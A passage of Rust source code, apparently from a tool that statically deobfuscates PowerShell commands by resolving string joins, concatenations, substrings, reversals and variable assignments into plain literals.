        case_insensitive = text
            .as_bytes()
            .get(pos)
            .is_some_and(|b| b.eq_ignore_ascii_case(&b'i'));
        pos += 1;
    }
    let end = pos.checked_add("replace".len())?;
    let method = text.get(pos..end)?;
    if !method.eq_ignore_ascii_case("replace") {
        return None;
    }
    if text
        .as_bytes()
        .get(end)
        .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
    {
        return None;
    }
    Some((end, case_insensitive))
}

fn replace_ps_literal(
    haystack: &str,
    needle: &str,
    replacement: &str,
    case_insensitive: bool,
) -> String {
    if !case_insensitive || needle.is_empty() {
        return haystack.replace(needle, replacement);
    }
    replace_ascii_case_insensitive(haystack, needle, replacement)
}

fn replace_ascii_case_insensitive(haystack: &str, needle: &str, replacement: &str) -> String {
    if needle.is_empty() {
        return haystack.to_string();
    }
    let haystack_bytes = haystack.as_bytes();
    let needle_bytes = needle.as_bytes();
    let mut out = String::with_capacity(haystack.len());
    let mut pos = 0;
    while pos < haystack.len() {
        if pos + needle.len() <= haystack.len()
            && haystack.is_char_boundary(pos)
            && haystack.is_char_boundary(pos + needle.len())
            && haystack_bytes[pos..pos + needle.len()].eq_ignore_ascii_case(needle_bytes)
        {
            out.push_str(replacement);
            pos += needle.len();
        } else {
            let Some(ch) = haystack[pos..].chars().next() else {
                break;
            };
            out.push(ch);
            pos += ch.len_utf8();
        }
    }
    out
}

fn expand_ps_dot_replace(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some(rel) = text[start..].find(['\'', '"']) {
        let literal_start = start + rel;
        let Some((literal_end, haystack)) = parse_ps_static_quoted_literal(text, literal_start)
        else {
            start = literal_start + 1;
            continue;
        };

        let mut pos = skip_ascii_ws(bytes, literal_end);
        if bytes.get(pos) != Some(&b'.') {
            start = literal_end;
            continue;
        }
        pos += 1;
        let Some(after_dot) = text.get(pos..) else {
            start = literal_end;
            continue;
        };
        let Some(method) = after_dot.get(.."Replace".len()) else {
            start = literal_end;
            continue;
        };
        if !method.eq_ignore_ascii_case("Replace") {
            start = literal_end;
            continue;
        }
        pos += "Replace".len();
        pos = skip_ascii_ws(bytes, pos);
        if bytes.get(pos) != Some(&b'(') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((needle_end, needle)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, needle_end);
        if bytes.get(pos) != Some(&b',') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((repl_end, repl)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, repl_end);
        if bytes.get(pos) != Some(&b')') {
            start = literal_end;
            continue;
        }
        let replaced = haystack.replace(&needle, &repl);
        matches.push((literal_start, pos + 1, format!("'{}'", replaced)));
        start = pos + 1;
    }

    let mut out = text.to_string();
    for (start_pos, end_pos, replacement) in matches.into_iter().rev() {
        out.replace_range(start_pos..end_pos, &replacement);
    }
    out
}

fn expand_ps_dot_substring(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some(rel) = text[start..].find(['\'', '"']) {
        let literal_start = start + rel;
        let Some((literal_end, value)) = parse_ps_static_quoted_literal(text, literal_start) else {
            start = literal_start + 1;
            continue;
        };

        let mut pos = skip_ascii_ws(bytes, literal_end);
        if bytes.get(pos) != Some(&b'.') {
            start = literal_end;
            continue;
        }
        pos += 1;
        let Some(after_dot) = text.get(pos..) else {
            start = literal_end;
            continue;
        };
        let Some(method) = after_dot.get(.."Substring".len()) else {
            start = literal_end;
            continue;
        };
        if !method.eq_ignore_ascii_case("Substring") {
            start = literal_end;
            continue;
        }
        pos += "Substring".len();
        pos = skip_ascii_ws(bytes, pos);
        if bytes.get(pos) != Some(&b'(') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((after_start, start_idx)) = parse_ps_usize_arg(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, after_start);
        let mut len_arg = None;
        if bytes.get(pos) == Some(&b',') {
            pos = skip_ascii_ws(bytes, pos + 1);
            let Some((after_len, len)) = parse_ps_usize_arg(text, pos) else {
                start = literal_end;
                continue;
            };
            len_arg = Some(len);
            pos = skip_ascii_ws(bytes, after_len);
        }
        if bytes.get(pos) != Some(&b')') {
            start = literal_end;
            continue;
        }
        let chars: Vec<char> = value.chars().collect();
        if start_idx > chars.len() {
            start = pos + 1;
            continue;
        }
        let end_idx = match len_arg {
            Some(len) => start_idx.saturating_add(len),
            None => chars.len(),
        };
        if end_idx > chars.len() {
            start = pos + 1;
            continue;
        }
        let sliced: String = chars[start_idx..end_idx].iter().collect();
        if sliced.len() > 8192 {
            start = pos + 1;
            continue;
        }
        matches.push((
            literal_start,
            pos + 1,
            format!("'{}'", sliced.replace('\'', "''")),
        ));
        start = pos + 1;
    }

    let mut out = text.to_string();
    for (start_pos, end_pos, replacement) in matches.into_iter().rev() {
        out.replace_range(start_pos..end_pos, &replacement);
    }
    out
}

fn parse_ps_static_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    let quote = text.as_bytes().get(start).copied()?;
    if quote == b'\'' {
        return parse_ps_single_quoted_literal(text, start);
    }
    if quote != b'"' {
        return None;
    }
    let mut pos = start + 1;
    let mut out = String::new();
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        pos += ch.len_utf8();
        if ch == '"' {
            return Some((pos, out));
        }
        if ch == '$' {
            return None;
        }
        if ch == '`' {
            let escaped = text[pos..].chars().next()?;
            pos += escaped.len_utf8();
            out.push(escaped);
            continue;
        }
        out.push(ch);
    }
    None
}

fn parse_complete_ps_static_quoted_literal(text: &str) -> Option<String> {
    let (end, value) = parse_ps_static_quoted_literal(text, 0)?;
    (end == text.len()).then_some(value)
}

fn parse_ps_usize_arg(text: &str, start: usize) -> Option<(usize, usize)> {
    let bytes = text.as_bytes();
    let mut pos = start;
    while bytes.get(pos).is_some_and(u8::is_ascii_digit) {
        pos += 1;
    }
    if pos == start {
        return None;
    }
    let value = text[start..pos].parse().ok()?;
    Some((pos, value))
}

#[allow(clippy::expect_used)]
static JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    // (?:'a',"b",'c') -join 'sep' or @('a',"b",'c') -join "sep"
    // Outer parens are optional for the bare array form.
    Regex::new(r#"@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")"#)
        .expect("join")
});

#[allow(clippy::expect_used)]
static UNARY_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    // -join @('a',"b",'c') or -join ('a',"b",'c')
    Regex::new(r#"(?is)-join\s+@?\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)"#)
        .expect("unary join")
});

#[allow(clippy::expect_used)]
static JOIN_PART_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)""#).expect("join part")
});

#[allow(clippy::expect_used)]
static STRING_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Join\s*\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*,\s*@?\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)\s*\)"#,
    )
    .expect("string join")
});

#[allow(clippy::expect_used)]
static STRING_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Concat\s*\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)"#,
    )
    .expect("string concat")
});

#[allow(clippy::expect_used)]
static SINGLE_LITERAL_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")"#,
    )
    .expect("single literal join")
});

#[allow(clippy::expect_used)]
static SPLIT_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\(?\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-(?:[ic])?split\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\)?\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")"#,
    )
    .expect("split join")
});

fn expand_single_literal_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = SINGLE_LITERAL_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            if previous_non_whitespace(text, full.start()) == Some(',') {
                return None;
            }
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))?
                .as_str();
            Some((full.start(), full.end(), format!("'{}'", value)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_split_join_literals(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = SPLIT_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = caps.get(1).or_else(|| caps.get(2))?.as_str();
            let split_sep = split_literal_separator(caps.get(3).or_else(|| caps.get(4))?.as_str())?;
            let join_sep = caps.get(5).or_else(|| caps.get(6))?.as_str();
            if split_sep.is_empty() || split_sep.len() > 64 || join_sep.len() > 64 {
                return None;
            }
            let parts: Vec<&str> = value.split(split_sep.as_str()).collect();
            if parts.is_empty() || parts.len() > 256 {
                return None;
            }
            let joined = parts.join(join_sep);
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn split_literal_separator(sep: &str) -> Option<String> {
    if sep.is_empty() {
        return None;
    }
    if sep.len() == 2 && sep.starts_with('\\') {
        let escaped = sep.as_bytes()[1] as char;
        if r#"\.^$|?*+()[]{}"#.contains(escaped) {
            return Some(escaped.to_string());
        }
    }
    if sep.as_bytes().iter().any(|b| {
        matches!(
            b,
            b'\\'
                | b'.'
                | b'^'
                | b'$'
                | b'|'
                | b'?'
                | b'*'
                | b'+'
                | b'('
                | b')'
                | b'['
                | b']'
                | b'{'
                | b'}'
        )
    }) {
        return None;
    }
    Some(sep.to_string())
}

#[allow(clippy::expect_used)]
static REVERSE_STRING_SLICE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")"#,
    )
    .expect("reverse string slice join")
});

fn expand_reverse_string_slice_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = REVERSE_STRING_SLICE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(4))
                .or_else(|| caps.get(5))?
                .as_str();
            let requested_len: usize =
                caps.get(3).or_else(|| caps.get(6))?.as_str().parse().ok()?;
            let chars: Vec<char> = value.chars().collect();
            if requested_len == 0 || requested_len > chars.len() {
                return None;
            }
            let reversed: String = chars.iter().rev().take(requested_len).collect();
            Some((full.start(), full.end(), format!("'{}'", reversed)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\.ToCharArray\s*\(\s*\)\s*;\s*\[array\]::Reverse\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("tochararray reverse join")
});

#[allow(clippy::expect_used)]
static LITERAL_TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;.{0,300}?\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*\.ToCharArray\s*\(\s*\)\s*;.{0,200}?\[array\]::Reverse\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\)\s*;.{0,200}?(\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\))"#,
    )
    .expect("literal tochararray reverse join")
});

fn expand_tochararray_reverse_join(text: &str) -> String {
    let mut matches: Vec<(usize, usize, String)> = TOCHARARRAY_REVERSE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let src_var = caps.get(1)?.as_str();
            let value = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let arr_var = caps.get(4)?.as_str();
            let src_ref = caps.get(5)?.as_str();
            let reverse_ref = caps.get(6)?.as_str();
            let dst_var = caps.get(7)?.as_str();
            let join_ref = caps.get(8)?.as_str();
            if src_ref != src_var || reverse_ref != arr_var || join_ref != arr_var {
                return None;
            }
            let reversed: String = value.chars().rev().collect();
            let replacement = format!(
                "${src_var}='{value}';${arr_var}=${src_var}.ToCharArray();[array]::Reverse(${arr_var});${dst_var}='{reversed}'"
            );
            Some((full.start(), full.end(), replacement))
        })
        .collect();
    matches.extend(
        LITERAL_TOCHARARRAY_REVERSE_JOIN_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let value = caps.get(1).or_else(|| caps.get(2))?.as_str();
                let arr_value = caps.get(3).or_else(|| caps.get(4))?.as_str();
                let reverse_value = caps.get(5).or_else(|| caps.get(6))?.as_str();
                let final_assignment = caps.get(7)?;
                let dst_var = caps.get(8)?.as_str();
                let join_value = caps.get(9).or_else(|| caps.get(10))?.as_str();
                if value != arr_value || value != reverse_value || value != join_value {
                    return None;
                }
                let reversed: String = value.chars().rev().collect();
                Some((
                    final_assignment.start(),
                    final_assignment.end(),
                    format!("${dst_var}='{reversed}'"),
                ))
            }),
    );
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn previous_non_whitespace(text: &str, pos: usize) -> Option<char> {
    text[..pos].chars().rev().find(|c| !c.is_whitespace())
}

fn expand_ps_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let sep = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("'{}'", parts.join(sep))))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_unary_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = UNARY_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() || parts.len() > 128 {
                return None;
            }
            let joined = parts.join("");
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_string_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let sep = caps.get(1).or_else(|| caps.get(2))?.as_str();
            let parts_text = caps.get(3)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() || parts.len() > 128 || sep.len() > 64 {
                return None;
            }
            let joined = parts.join(sep);
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_string_concat_static(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_CONCAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() || parts.len() > 128 {
                return None;
            }
            let joined = parts.join("");
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static PS_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    // $name = 'literal', $name = "literal", or the common no-op subexpression
    // wrapper $name = $('literal'). Double-quoted values with interpolation or
    // metacharacters are intentionally skipped.
    Regex::new(
        r#"\$(?:(?:global|script|local|private):)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:\$\(\s*)?(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")(?:\s*\))?"#,
    )
    .expect("ps var assign")
});

#[allow(clippy::expect_used)]
static PS_INT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,6})(?:\s*(?:;|\r?\n|$))"#)
        .expect("ps int assign")
});

#[allow(clippy::expect_used)]
static PS_PATH_COMBINE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$(?:(?:global|script|local|private):)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?IO\.Path\]\s*::\s*Combine\s*\(\s*([^,()]{1,256})\s*,\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")\s*\)"#,
    )
    .expect("ps Path.Combine assign")
});

#[allow(clippy::expect_used)]
static PS_PATH_COMBINE_ARG_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)^\s*\[(?:System\.)?IO\.Path\]\s*::\s*Combine\s*\(\s*([^,()]{1,256})\s*,\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")\s*\)\s*$"#,
    )
    .expect("ps Path.Combine arg")
});

#[allow(clippy::expect_used)]
static PS_DQ_INTERPOLATED_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$(?:(?:global|script|local|private):)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"([^"]{0,4096})""#,
    )
    .expect("ps interpolated double-quoted assign")
});

#[allow(clippy::expect_used)]
static PS_ENV_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$(?:(?:global|script|local|private):)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\$env:[A-Za-z_][A-Za-z0-9_]*)\s*\+\s*(?:'([^']*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
    )
    .expect("ps env concat assign")
});

#[allow(clippy::expect_used)]
static PS_ALIAS_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$(?:(?:global|script|local|private):)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\$(?:(?:global|script|local|private):)?([A-Za-z_][A-Za-z0-9_]*)\b"#,
    )
    .expect("ps alias assign")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?"#)
        .expect("ps array assign")
});

#[allow(clippy::expect_used)]
static PS_JOIN_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\)?"#)
        .expect("ps join assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_REF_RE: Lazy<Regex> = Lazy::new(|| {
    // $name reference
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps var ref")
});

#[allow(clippy::expect_used)]
static PS_INDEX_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\]\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\])"#,
    )
    .expect("ps index concat assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("ps var concat assign")
});

#[allow(clippy::expect_used)]
static PS_INDEX_REF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]"#).expect("ps index ref")
});

fn ps_literal_assignment_value(caps: &regex::Captures<'_>) -> Option<String> {
    caps.get(2)
        .map(|m| m.as_str().replace("''", "'"))
        .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))
}

fn ps_integer_bindings(text: &str) -> std::collections::HashMap<String, usize> {
    PS_INT_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str().to_ascii_lowercase();
            let value = caps.get(2)?.as_str().parse().ok()?;
            Some((name, value))
        })
        .collect()
}

fn resolve_ps_usize_expr(
    expr: &str,
    bindings: &std::collections::HashMap<String, usize>,
) -> Option<usize> {
    let mut total = 0usize;
    let mut saw_part = false;
    for raw in expr.split('+') {
        let part = raw.trim();
        if part.is_empty() {
            return None;
        }
        let value = if let Some(name) = part.strip_prefix('$') {
            if !name
                .chars()
                .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
            {
                return None;
            }
            *bindings.get(&name.to_ascii_lowercase())?
        } else {
            part.parse().ok()?
        };
        total = total.checked_add(value)?;
        saw_part = true;
    }
    saw_part.then_some(total)
}

fn insert_ps_path_combine_bindings(
    text: &str,
    bindings: &mut std::collections::HashMap<String, String>,
) {
    for caps in PS_PATH_COMBINE_ASSIGN_RE.captures_iter(text) {
        let Some(name) = caps.get(1) else {
            continue;
        };
        let Some(base) = caps.get(2).map(|m| ps_unquote_path_component(m.as_str())) else {
            continue;
        };
        let Some(leaf) = caps
            .get(3)
            .map(|m| m.as_str().replace("''", "'"))
            .or_else(|| caps.get(4).map(|m| m.as_str().to_string()))
        else {
            continue;
        };
        if base.is_empty() || leaf.is_empty() || is_large_literal_carrier(&leaf) {
            continue;
        }
        let joined = join_ps_path_components(&base, &leaf);
        bindings.insert(name.as_str().to_ascii_lowercase(), joined);
    }
}

fn ps_unquote_path_component(value: &str) -> String {
    let trimmed = value.trim();
    if let Some(literal) = ps_literal_arg(trimmed) {
        literal
    } else {
        trimmed.to_string()
    }
}

fn join_ps_path_components(base: &str, leaf: &str) -> String {
    let base = base.trim_end_matches(['\\', '/']);
    let leaf = leaf.trim_start_matches(['\\', '/']);
    if base.is_empty() {
        leaf.to_string()
    } else if leaf.is_empty() {
        base.to_string()
    } else {
        format!("{base}\\{leaf}")
    }
}

fn expand_ps_index_concat_assignments(text: &str) -> String {
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    if bindings.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_INDEX_CONCAT_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let dst = caps.get(1)?.as_str();
            let rhs = caps.get(2)?.as_str();
            let mut decoded = String::new();
            for ref_caps in PS_INDEX_REF_RE.captures_iter(rhs) {
                let var = ref_caps.get(1)?.as_str();
                let idx: usize = ref_caps.get(2)?.as_str().parse().ok()?;
                let value = bindings.get(&var.to_ascii_lowercase())?;
                decoded.push(value.chars().nth(idx)?);
            }
            if decoded.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("${dst}='{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_variables(text: &str) -> String {
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let after = text[caps.get(0).map_or(0, |m| m.end())..].trim_start();
            if after.starts_with('+') {
                continue;
            }
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    insert_ps_path_combine_bindings(text, &mut bindings);
    for caps in PS_ARRAY_ASSIGN_RE.captures_iter(text) {
        let (Some(n), Some(parts_text)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let parts: Vec<String> = JOIN_PART_RE
            .captures_iter(parts_text.as_str())
            .filter_map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .collect();
        if !parts.is_empty() {
            bindings.insert(n.as_str().to_ascii_lowercase(), parts.join(""));
        }
    }
    for caps in PS_JOIN_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(src), Some(sep)) = (
            caps.get(1),
            caps.get(2),
            caps.get(3).or_else(|| caps.get(4)),
        ) else {
            continue;
        };
        if let Some(value) = bindings.get(&src.as_str().to_ascii_lowercase()).cloned() {
            let joined = if sep.as_str().is_empty() {
                value
            } else {
                value
                    .chars()
                    .map(|c| c.to_string())
                    .collect::<Vec<_>>()
